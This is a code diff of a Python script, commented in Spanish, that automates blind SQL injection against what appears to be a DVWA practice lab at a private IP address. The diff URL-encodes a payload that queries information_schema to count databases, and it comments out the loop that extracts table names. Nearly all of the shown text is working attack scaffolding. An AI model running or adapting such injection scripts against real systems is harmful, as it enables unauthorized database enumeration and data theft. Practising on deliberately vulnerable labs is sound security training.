@@ -3,7 +3,7 @@ import requests
 
 def sacarNumTablas(url):
     indice = url.find("*")
-    payload = "1' and (select+count(schema_name) from information_schema.schemata)=@ -- -"
+    payload = "1'+and+(select+count(schema_name)+from+information_schema.schemata)%3d@+--+-"
     if indice == -1:
         raise ValueError("No se encontro el asterisco (*) en la cadena base.")
     
@@ -110,8 +110,8 @@ def sacarNombre(longitudNombreTabla, url, numTabla):
 print("Hola mundo")
 url = "http://10.0.2.20/vulnerabilities/sqli_blind/?id=*&Submit=Submit#"
 numeroBaseDeDatos=sacarNumTablas(url)
-for i in range(numeroBaseDeDatos):
-    longitudNombreTabla = SacarLargoNombre(i, url)
-    sacarNombre(longitudNombreTabla, url, i)
+#for i in range(numeroBaseDeDatos):
+ #   longitudNombreTabla = SacarLargoNombre(i, url)
+  #  sacarNombre(longitudNombreTabla, url, i)
 
 
